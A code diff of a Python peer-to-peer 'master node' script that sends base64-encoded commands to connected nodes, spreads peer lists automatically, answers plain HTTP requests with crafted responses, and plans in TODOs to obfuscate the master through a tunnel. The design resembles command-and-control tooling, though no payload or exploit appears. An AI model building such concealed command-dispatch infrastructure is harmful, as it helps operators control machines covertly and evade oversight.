@@ -3,11 +3,11 @@
 #######################################################################
 ### NODE 0 [MASTER] - not executing commands                        ###
 ###                 - input                                         ###
-###                 - TODO: selective connections (not any in list) ###
+###                 - TODO: selective connections                   ###
 ###                 - ?????????                                     ###
 ###                 - ?????????                                     ###
 ###                 - ?????????                                     ###
-###                                                                 ###
+###                 - send connections list to each new node        ###
 #######################################################################
 #######################################################################
 
@@ -15,15 +15,13 @@ import socket
 import select
 import queue
 import node_fnc
-import random
-import json
-import errno
-import base64
-import time
-import ipaddress
 import tcp_http
-import re
 
+from ipaddress import ip_address
+from re import search as regex_search
+from time import strftime, localtime, sleep
+from random import randint
+from base64 import b64encode, b64decode
 
 # Console colors
 W = '\033[0m'  # white (normal)
@@ -40,9 +38,8 @@ END = '\033[0m'
 class Node:
 
     def __init__(self, ip: str, port: int) -> None:
-        self.__list = []
         self._socket = {
-            "id": str(random.randint(10000000, 99999999)),
+            "id": str(randint(10000000, 99999999)),
             "socket": socket.socket(socket.AF_INET, socket.SOCK_STREAM),
             "ip": str(ip),
             "port": int(port),
@@ -53,22 +50,6 @@ class Node:
         self._tcp_connections = [ self._socket ]
         self._INPUT, self._OUTPUT, self._EXCEPT = [], [], []
         self._EXIT_ON_CMD = False
-
-
-    def get_socket(self) -> socket.socket:
-        return self._socket
-
-
-    def get_connections(self) -> list:
-        return self._tcp_connections
-
-
-    def set___list(self, newlist: list) -> None:
-        self.__list = newlist
-
-
-    def set_connections(self, connections: list):
-        self._tcp_connections = connections
 
 
     #
@@ -85,7 +66,7 @@ class Node:
             print(f"socket error on socket.bind()/socket.listen(): {e.args[::-1]}")
             return 1
         except Exception as e:
-            print(f"unexpected error on socket.bind()/socket.listen(): {e.args[::-1]}")
+            print(f"error on socket.bind()/socket.listen(): {e.args[::-1]}")
             return 1
         return 0
 
@@ -100,15 +81,21 @@ class Node:
                     if ip == self._tcp_connections[i]["ip"] and port == self._tcp_connections[i]["port"]
         }
 
+        if target:
+            node_id = target["id"]
+        else:
+            print(f"[!] unable to find node_id for OUT target: {target}")
+            node_id = str(randint(10000000, 99999999))
+
         conn_socket = {
-            "id": target["id"] if target else str(random.randint(10000000, 99999999)),
+            "id": node_id,
             "socket": socket.socket(socket.AF_INET, socket.SOCK_STREAM),
             "ip": ip,
             "port": int(port),
             "type": "OUT"
         }
 
-        t = time.strftime("%Y-%m-%d %I:%M:%S %p", time.localtime())
+        t = strftime("%Y-%m-%d %I:%M:%S %p", localtime())
 
         for node in range(len(self._tcp_connections)):
             if self._tcp_connections[node]["ip"] == conn_socket["ip"] \
@@ -122,7 +109,7 @@ class Node:
             print(f"socket error on socket.connect(): {ip}:{port} :: {e.args[::-1]}")
             return 1
         except Exception as e:
-            print(f"unexpected error on socket.connect(): {ip}:{port} :: {e.args[::-1]}")
+            print(f"error on socket.connect(): {ip}:{port} :: {e.args[::-1]}")
             return 1
 
         self._tcp_connections.append(conn_socket)
@@ -141,25 +128,28 @@ class Node:
     #
     def send_list(self, target: socket.socket) -> None:
         
+        temp_list = []
+
         for i in range(len(self._tcp_connections)):
             ftd = {}
             for key, val in self._tcp_connections[i].items():
                 if key == 'socket':
                     continue
                 ftd[key] = val
-            self.__list.append(ftd)
+            temp_list.append(ftd)
 
         # filter nodes => send only OUT & MASTER sockets
-        self.__list[:] = (node for node in self.__list if node["type"] != "INC")
+        temp_list[:] = (node for node in temp_list if node["type"] != "INC")
 
         # convert to string with newlines
-        out1 = "inc-conns:"
-        out2 = "\n".join(f"{peer['ip']}:{peer['port']}" for peer in self.__list)
+        peerslist = "\r\n".join(f"{peer['ip']}:{peer['port']}" for peer in temp_list)
         
-        out = (out1 + out2).encode()
+        b64out = "inc-conns:".encode() + b64encode(peerslist.encode())
 
-        self.__list.clear()
-        target.sendall(out)
+        print(f"DEBUG: sending list:\r\n{peerslist}\r\n")
+
+        temp_list.clear()
+        target.sendall(b64out)
 
 
     #
@@ -203,17 +193,23 @@ class Node:
         except Exception as e:
             if self._EXIT_ON_CMD:
                 return 1
-            print(f"unexpected error on socket.accept(): {e.args[::-1]}")
+            print(f"error on socket.accept(): {e.args[::-1]}")
             return -1
         
         target = {
             "id": self._tcp_connections[i]["id"] \
                     for i in range(len(self._tcp_connections)) \
-                    if addr[0] == self._tcp_connections[i]["ip"]
+                        if addr[0] == self._tcp_connections[i]["ip"]
         }
 
+        if target:
+            node_id = target["id"]
+        else:
+            print(f"[!] unable to find node_id for INC target: {target}")
+            node_id = str(randint(10000000, 99999999))
+
         self._tcp_connections.append({
-            "id": target["id"] if target else str(random.randint(10000000, 99999999)),
+            "id": node_id,
             "socket": sock,
             "ip": addr[0],
             "port": int(addr[1]),
@@ -223,7 +219,7 @@ class Node:
         stream_in.append(sock)
         q.put_nowait(self._tcp_connections)
 
-        t = time.strftime(c.TIME_FORMAT, time.localtime())
+        t = strftime(c.TIME_FORMAT, localtime())
 
         out = f"connected {'':<5}<<< {addr[0]}:{addr[1]}"
         node_fnc.write_log(out, c)
@@ -269,16 +265,7 @@ class Node:
             if already_connected:
                 continue
 
-            # selective connections
-            #if peer_list[node]["type"] == 'OUT':
-            #    ans = input(f">>> accept connection from {peer_list[node]['ip']}:{peer_list[node]['port']} ??")
-            #    if ans and (ans == 'y' or ans == 'yes'):
-            #        self.connect_to_node(ip=peer_list[node]["ip"], port=peer_list[node]["port"], c=c)
-            #    else:
-            #        print(f"skipping {peer_list[node]['ip']}:{peer_list[node]['port']}")
-            #else:
-            #    self.connect_to_node(ip=peer_list[node]["ip"], port=peer_list[node]["port"], c=c)
-
+            # TODO: selective connections
             
             if node_fnc.validate_ip_port(ip=ip, port=port):
                 continue
@@ -315,7 +302,7 @@ class Node:
             except Exception as e:
                 if self._EXIT_ON_CMD:
                     return 1
-                print(f"unexpected error on select.socket-select(): {e.args[::-1]}")
+                print(f"error on select.socket-select(): {e.args[::-1]}")
                 return -1
 
             for s in self._INPUT:
@@ -362,7 +349,7 @@ class Node:
 
                 if inc_data:
                     
-                    t = time.strftime(c.TIME_FORMAT, time.localtime())
+                    t = strftime(c.TIME_FORMAT, localtime())
 
                     #
                     # drop blacklisted requests => 403
@@ -371,7 +358,7 @@ class Node:
                     break_continue = False
 
                     for request_path in blacklist:
-                        if re.search(f"{request_path}", inc_data):
+                        if regex_search(f"{request_path}", inc_data):
                             print(f"dropping blacklisted request: {request_path}")
                             
                             headers_arr = tcp_http.set_http_headers()
@@ -390,7 +377,7 @@ class Node:
                     #
                     # http (plaintext) => auto-response over same socket
                     #
-                    if re.search("^(GET|POST){1}\s{1}/[a-zA-Z0-9]*\s{1}HTTP/1.1", inc_data):
+                    if regex_search("^(GET|POST){1}\s{1}/[a-zA-Z0-9]*\s{1}HTTP/1.1", inc_data):
                         # craft & send HTTP response to target
                         response = tcp_http.craft_http_response(inc_data)
                         s.send(response.encode('utf-8'))
@@ -414,34 +401,39 @@ class Node:
                             break
 
                         elif inc_data[:10] == "inc-conns:":
-                            self.loop_connect_nodes(peer_list=inc_data[10:], q=q, c=c)
-                            continue
+                            try:
+                                peerlist = b64decode(inc_data[10:]).decode()
+                                if isinstance(peerlist, bytes):
+                                    peerlist = peerlist.decode()
+                                self.loop_connect_nodes(peer_list=peerlist, q=q, c=c)
+                                continue
+                            except Exception as e:
+                                print(f"error on base64-decode connection-list: {e.args[::-1]}")
 
                         elif inc_data[:12] == "inc-ret-cmd:":
                             try:
-                                inc_data = base64.b64decode(inc_data[12:]).decode()
+                                inc_data = b64decode(inc_data[12:]).decode()
                                 if isinstance(inc_data, bytes):
                                     inc_data = inc_data.decode()
                             except Exception as e:
-                                print(f"unexpected error on base64-decode: {e.args[::-1]}")
+                                print(f"error on base64-decode returning-cmd: {e.args[::-1]}")
 
                         elif node_fnc.isbase64(inc_data):
                             try:
-                                inc_data = base64.b64decode(inc_data).decode()
+                                inc_data = b64decode(inc_data).decode()
                                 if isinstance(inc_data, bytes):
                                     inc_data = inc_data.decode()
                             except Exception as e:
                                 pass
-                                # print(f"unexpected error on base64-decode: {e.args[::-1]}")
 
                         if isinstance(inc_data, bytes):
                             inc_data = inc_data.decode()
 
                         data_formatted = inc_data.replace("\r\n", f"\r\n{'':<46}")
 
-                        print(f"{t} :: [{inc['node']['ip']}:{inc['node']['port']}] :: {R}{data_formatted}{END}")
+                        print(f"{t} :: [{inc['node']['id']}]:[{inc['node']['ip']}:{inc['node']['port']}] :: {R}{data_formatted}{END}")
 
-        return 0
+        #return 0
 
 
     #
@@ -453,7 +445,7 @@ class Node:
         operation_success=False
 
         try:
-            temp = ipaddress.ip_address(ip)
+            temp = ip_address(ip)
         except ValueError as e:
             print(f"[!] invalid ip address: {e.args[::-1]}")
             return
@@ -506,7 +498,7 @@ class Node:
             ssi.remove(s)
         for node in range(len(self._tcp_connections)):
             if node and self._tcp_connections[node]["socket"] == s:
-                t = time.strftime(c.TIME_FORMAT, time.localtime())
+                t = strftime(c.TIME_FORMAT, localtime())
                 socket_direction_type = ">>>" if self._tcp_connections[node]['type'] == "OUT" else "<<<"
 
                 out = f"disconnected {'':<2}{socket_direction_type} {self._tcp_connections[node]['ip']}:{self._tcp_connections[node]['port']}"
@@ -527,9 +519,8 @@ class Node:
     #
     def close_master_socket(self) -> None:
         connections = self._tcp_connections
-        t = time.strftime("%Y-%m-%d %I:%M:%S %p", time.localtime())
+        t = strftime("%Y-%m-%d %I:%M:%S %p", localtime())
         self.loop_close_all_sockets()
-        self.set_connections([])
         self._socket["socket"].shutdown(socket.SHUT_RDWR)
         self._socket["socket"].close()
         print("disconnected all clients..\nmaster socket closed!")
@@ -587,7 +578,7 @@ class Node:
 
             if operation_success:
                 print(f">>> sockets closed successfuly for ip [{ip}]")
-                time.sleep(0.5)
+                sleep(0.5)
             else:
                 print(f">>> error! sockets not closed for ip [{ip}]")
 
@@ -620,7 +611,7 @@ class Node:
             self.dc_node(ip=ip, q=q, c=c)
             return 1
         except Exception as e:
-            print(f"unexpected error on socket.send(): {e.args[::-1]}")
+            print(f"error on socket.send(): {e.args[::-1]}")
             self.dc_node(ip=ip, q=q, c=c)
             return 1
         return 0
@@ -649,7 +640,7 @@ class Node:
                 self.dc_node(ip=self._tcp_connections[node]["ip"], q=q, c=c)
                 return 1
             except Exception as e:
-                print(f"unexpected error on soocket.send(): {e.args[::-1]}")
+                print(f"error on soocket.send(): {e.args[::-1]}")
                 self.dc_node(ip=self._tcp_connections[node]["ip"], q=q, c=c)
                 return 1
         return 0
@@ -668,16 +659,16 @@ class Node:
             print(f"target {ip}:{port} doesn't exist")
             return 1
         # send flag that packets are command
-        cmd_flag = "inccmd:".encode()
         print(f">>> sending command [{cmd.decode()}] to node [{ip}:{port}]")
         try:
-            target["node"]["socket"].send(cmd_flag + cmd)
+            cmd64 = "inccmd:".encode() + b64encode(cmd)
+            target["node"]["socket"].send(cmd64)
         except socket.error as e:
             print(f"socket error on cmd socket.send(): {e.args[::-1]}")
             self.dc_node(ip=ip, q=q, c=c)
             return 1
         except Exception as e:
-            print(f"unexpected error on cmd socket.send(): {e.args[::-1]}")
+            print(f"error on cmd socket.send(): {e.args[::-1]}")
             self.dc_node(ip=ip, q=q, c=c)
             return 1
         return 0 
@@ -702,16 +693,20 @@ class Node:
                     print(f"[!] connecting to peer {ip}:{port}")
                     self.connect_to_node(ip=ip, port=port, c=c)
                     q.put_nowait(self._tcp_connections)
-                    time.sleep(0.5)
+                    sleep(0.5)
 
         except Exception as e:
-            print(f"unexpected error on file.read() in conn_from_list(): {e.args[::-1]}")
+            print(f"error on file.read() in conn_from_list(): {e.args[::-1]}")
     
 
 
 
 
 ###### TODO: implement a function to check on nodes connections (broadcast ping) & clear list accordingly
+
+###### TODO: implement global list of peers which will be redistributed among peers (obfuscate node-0 => tunnel?)
+
+###### TODO: implement encryption 
 
 
 
